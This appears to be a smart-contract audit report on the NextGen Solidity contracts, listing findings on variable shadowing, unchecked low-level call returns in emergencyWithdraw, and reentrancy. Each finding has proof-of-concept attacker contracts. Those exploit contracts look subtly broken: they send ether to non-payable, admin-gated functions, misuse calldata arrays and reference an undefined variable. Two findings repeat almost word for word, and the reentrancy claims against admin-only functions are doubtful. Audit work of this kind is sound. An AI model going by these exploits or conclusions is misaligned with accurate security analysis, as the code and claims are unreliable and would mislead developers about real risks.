## [L-01] Shadowing local variables
## Impact
Detection of shadowing using local variables.

Shadowing using local variables in Solidity occurs when a local variable in a function has the same name as a state variable. When this happens, the local variable takes precedence over the state variable within the scope of the function, effectively "shadowing" it. This can lead to bugs if the programmer intended to interact with the state variable but inadvertently interacted with the local variable instead. It's generally recommended to avoid variable shadowing to prevent such confusion and potential errors.

**Locations** 
## 1
```txt
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol
```
Variables shadowing are:
symbol
name
```sol
NextGenCore.constructor(string,string,address).symbol (smart-contracts/NextGenCore.sol#108) shadows:
- ERC721.symbol() (smart-contracts/ERC721.sol#87-89) (function)
- IERC721Metadata.symbol() (smart-contracts/IERC721Metadata.sol#22) (function)
`constructor(string memory name, string memory `symbol`, address _adminsContract) ERC721(name, symbol) {`
```
```sol
NextGenCore.constructor(string,string,address).name (smart-contracts/NextGenCore.sol#108) shadows:
- ERC721.name() (smart-contracts/ERC721.sol#80-82) (function)
- IERC721Metadata.name() (smart-contracts/IERC721Metadata.sol#17) (function)
`constructor(string memory `name`, string memory symbol, address _adminsContract) ERC721(name, symbol) {`
```
## 2
```txt
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerVRF.sol
```
Variables shadowing are:
vrfCoordinator
```sol
NextGenRandomizerVRF.constructor(uint64,address,address,address).vrfCoordinator (smart-contracts/RandomizerVRF.sol#39) shadows:
- VRFConsumerBaseV2.vrfCoordinator (smart-contracts/VRFConsumerBaseV2.sol#99) (state variable)
    `constructor(uint64 subscriptionId, address `vrfCoordinator`, address _gencore, address _adminsContract) VRFConsumerBaseV2(vrfCoordinator) {`
```
## Recommendation
Rename the local variables that shadow another component.
## [L-02] Return value of low level call not checked
## Impact
The return value of low level call is not checked.
If the msg.sender is a contract and its receive() function has the potential to revert, the code payable(admin).call{value: balance}(""); could potentially return a false result, which is not being verified. As a result, the calling functions may exit without successfully returning ethers to senders.
The emergencyWithdraw function does not check the return value of low-level calls. 
This can lock Ether in the contract if the call fails or may compromise the contract if the ownership is being changed.
The following call was detected without return value validations in the emergencyWithdraw function.
`(bool success, ) = payable(admin).call{value: balance}("");`
## Proof of Concept
**Vulnerable emergencyWithdraw function**
```sol
// Ln 461-466
    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
        uint balance = address(this).balance;
        address admin = adminsContract.owner();
        (bool success, ) = payable(admin).call{value: balance}("");
        emit Withdraw(msg.sender, success, balance);
    }
```
**Vulnerable code snippet**
```sol
// Ln 464
(bool success, ) = payable(admin).call{value: balance}("");
```
**Exploit low level call on emergencyWithdraw function**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./MinterContract.sol";

contract tMinterContract {

   MinterContract public x1;

   constructor(MinterContract _x1) {

      x1 = MinterContract(_x1);
  
   }

   function testLowCal() public payable {

      x1.emergencyWithdraw{value: 3 ether}();

   }

   receive() external payable {}
      
   } 
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
It's recommended to check the return value to be true or just use OpenZeppelin Address library sendValue() function for ether transfer. 
See https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.3/contracts/utils/Address.sol#L64 .
Ensure return value is checked using conditional statements for low-level calls. 
Conditional statements like `require()`.
## [L-03] Return value of low level call not checked
## Impact
The return value of low level call is not checked.
If the msg.sender is a contract and its receive() function has the potential to revert, the code payable(admin).call{value: balance}(""); could potentially return a false result, which is not being verified. As a result, the calling functions may exit without successfully returning ethers to senders.
The emergencyWithdraw function does not check the return value of low-level calls. 
This can lock Ether in the contract if the call fails or may compromise the contract if the ownership is being changed.
The following call was detected without return value validations in the emergencyWithdraw function.
`(bool success, ) = payable(admin).call{value: balance}("");`
## Proof of Concept
**Vulnerable emergencyWithdraw function**
```sol
// Ln 79-84
    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
        uint balance = address(this).balance;
        address admin = adminsContract.owner();
        (bool success, ) = payable(admin).call{value: balance}("");
        emit Withdraw(msg.sender, success, balance);
    }
```
**Vulnerable code snippet**
```sol
// Ln 82
        (bool success, ) = payable(admin).call{value: balance}("");
```
**Exploit low level call on emergencyWithdraw function**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./RandomizerRNG.sol";

contract tRandomizerRNG {

   RandomizerRNG public x1;

   constructor(RandomizerRNG _x1) {

      x1 = RandomizerRNG(_x1);
  
   }

   function testLowCal() public payable {

      x1.emergencyWithdraw{value: 3 ether}();

   }

   receive() external payable {}
      
   } 
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
It's recommended to check the return value to be true or just use OpenZeppelin Address library sendValue() function for ether transfer. 
See https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.3/contracts/utils/Address.sol#L64 .
Ensure return value is checked using conditional statements for low-level calls. 
Conditional statements like `require()`.
## [L-04] Reentrancy flaw
## Impact
The reentrancy vulnerability uses the attack contract to call into the victim contract several times before the victim contract's balance updates.
Hence allowing the attacker to withdraw e.g. 2 ether when they only deposited 1 ether.
Which means double entry counting duplicate withdrawals for only one genuine withdrawal.
## Proof of Concept
**Vulnerable burnOrSwapExternalToMint function to reentrancy**
```sol
// Ln 326-365
    function burnOrSwapExternalToMint(address _erc721Collection, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, string memory _tokenData, bytes32[] calldata merkleProof, uint256 _saltfun_o) public payable {
        bytes32 externalCol = keccak256(abi.encodePacked(_erc721Collection,_burnCollectionID));
        require(burnExternalToMintCollections[externalCol][_mintCollectionID] == true, "Initialize external burn");
        require(setMintingCosts[_mintCollectionID] == true, "Set Minting Costs");
        address ownerOfToken = IERC721(_erc721Collection).ownerOf(_tokenId);
        if (msg.sender != ownerOfToken) {
            bool isAllowedToMint;
            isAllowedToMint = dmc.retrieveGlobalStatusOfDelegation(ownerOfToken, 0x8888888888888888888888888888888888888888, msg.sender, 1) || dmc.retrieveGlobalStatusOfDelegation(ownerOfToken, 0x8888888888888888888888888888888888888888, msg.sender, 2);
            if (isAllowedToMint == false) {
            isAllowedToMint = dmc.retrieveGlobalStatusOfDelegation(ownerOfToken, _erc721Collection, msg.sender, 1) || dmc.retrieveGlobalStatusOfDelegation(ownerOfToken, _erc721Collection, msg.sender, 2);    
            }
            require(isAllowedToMint == true, "No delegation");
        }
        require(_tokenId >= burnOrSwapIds[externalCol][0] && _tokenId <= burnOrSwapIds[externalCol][1], "Token id does not match");
        IERC721(_erc721Collection).safeTransferFrom(ownerOfToken, burnOrSwapAddress[externalCol], _tokenId);
        uint256 col = _mintCollectionID;
        address mintingAddress;
        uint256 phase;
        string memory tokData = _tokenData;
        if (block.timestamp >= collectionPhases[col].allowlistStartTime && block.timestamp <= collectionPhases[col].allowlistEndTime) {
            phase = 1;
            bytes32 node;
            node = keccak256(abi.encodePacked(_tokenId, tokData));
            mintingAddress = ownerOfToken;
            require(MerkleProof.verifyCalldata(merkleProof, collectionPhases[col].merkleRoot, node), 'invalid proof');            
        } else if (block.timestamp >= collectionPhases[col].publicStartTime && block.timestamp <= collectionPhases[col].publicEndTime) {
            phase = 2;
            mintingAddress = ownerOfToken;
            tokData = '"public"';
        } else {
            revert("No minting");
        }
        uint256 collectionTokenMintIndex;
        collectionTokenMintIndex = gencore.viewTokensIndexMin(col) + gencore.viewCirSupply(col);
        require(collectionTokenMintIndex <= gencore.viewTokensIndexMax(col), "No supply");
        require(msg.value >= (getPrice(col) * 1), "Wrong ETH");
        uint256 mintIndex = gencore.viewTokensIndexMin(col) + gencore.viewCirSupply(col);
        gencore.mint(mintIndex, mintingAddress, ownerOfToken, tokData, _saltfun_o, col, phase);
        collectionTotalAmount[col] = collectionTotalAmount[col] + msg.value;
    }
```
**Vulnerable payArtist function to reentrancy**
```sol
// 415-444
    function payArtist(uint256 _collectionID, address _team1, address _team2, uint256 _teamperc1, uint256 _teamperc2) public FunctionAdminRequired(this.payArtist.selector) {
        require(collectionArtistPrimaryAddresses[_collectionID].status == true, "Accept Royalties");
        require(collectionTotalAmount[_collectionID] > 0, "Collection Balance must be grater than 0");
        require(collectionRoyaltiesPrimarySplits[_collectionID].artistPercentage + _teamperc1 + _teamperc2 == 100, "Change percentages");
        uint256 royalties = collectionTotalAmount[_collectionID];
        collectionTotalAmount[_collectionID] = 0;
        address tm1 = _team1;
        address tm2 = _team2;
        uint256 colId = _collectionID;
        uint256 artistRoyalties1;
        uint256 artistRoyalties2;
        uint256 artistRoyalties3;
        uint256 teamRoyalties1;
        uint256 teamRoyalties2;
        artistRoyalties1 = royalties * collectionArtistPrimaryAddresses[colId].add1Percentage / 100;
        artistRoyalties2 = royalties * collectionArtistPrimaryAddresses[colId].add2Percentage / 100;
        artistRoyalties3 = royalties * collectionArtistPrimaryAddresses[colId].add3Percentage / 100;
        teamRoyalties1 = royalties * _teamperc1 / 100;
        teamRoyalties2 = royalties * _teamperc2 / 100;
        (bool success1, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd1).call{value: artistRoyalties1}("");
        (bool success2, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd2).call{value: artistRoyalties2}("");
        (bool success3, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd3).call{value: artistRoyalties3}("");
        (bool success4, ) = payable(tm1).call{value: teamRoyalties1}("");
        (bool success5, ) = payable(tm2).call{value: teamRoyalties2}("");
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd1, success1, artistRoyalties1);
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd2, success2, artistRoyalties2);
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd3, success3, artistRoyalties3);
        emit PayTeam(tm1, success4, teamRoyalties1);
        emit PayTeam(tm2, success5, teamRoyalties2);
    }
```
**Vulnerable updateAdminContract function to reentrancy**
```sol
// 454-457
    function updateAdminContract(address _newadminsContract) public FunctionAdminRequired(this.updateAdminContract.selector) {
        require(INextGenAdmins(_newadminsContract).isAdminContract() == true, "Contract is not Admin");
        adminsContract = INextGenAdmins(_newadminsContract);
    }
```
**Vulnerable emergencyWithdraw function to reentrancy**
```sol
// Ln 461-466
    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
        uint balance = address(this).balance;
        address admin = adminsContract.owner();
        (bool success, ) = payable(admin).call{value: balance}("");
        emit Withdraw(msg.sender, success, balance);
    }
```
**Exploit Reentrancy**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./MinterContract.sol";

contract tMinterContract {

   MinterContract public x1;

   constructor(MinterContract _x1) {

      x1 = MinterContract(_x1);

   }

   function testRenterD() public payable {
      
      string memory tokenData = string("0x1e18");
      bytes32[] calldata merkleProof = new bytes32[1]();
      merkleProof[0] = bytes32(0x3);      

      x1.burnOrSwapExternalToMint(address(_x1), 
         uint256(2), 
         uint256(24), 
         uint256(34), 
         tokenData, 
         merkleProof, 
         uint256(7));

      x1.payArtist{value: 2 ether}(uint256(24), 
         address(_x1), 
         address(_x1), 
         uint256(10), 
         uint256(20));

      x1.updateAdminContract(address(_x1));

      x1.emergencyWithdraw{value: 2 ether}();

   }

   receive() external payable {

      msg.sender.transfer(payable(address(_x1)).balance);

   }
   
   }
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
All functions that are not internal and are making a call should have a reentrancy guard added to them.
Checks-Effects-Interactions should be applied to the functions. 
Balance updates should be made at the beginning of the call.
The actual call should be made at the end of the function.
So that the balance is already updated first and reentrancy is not possible.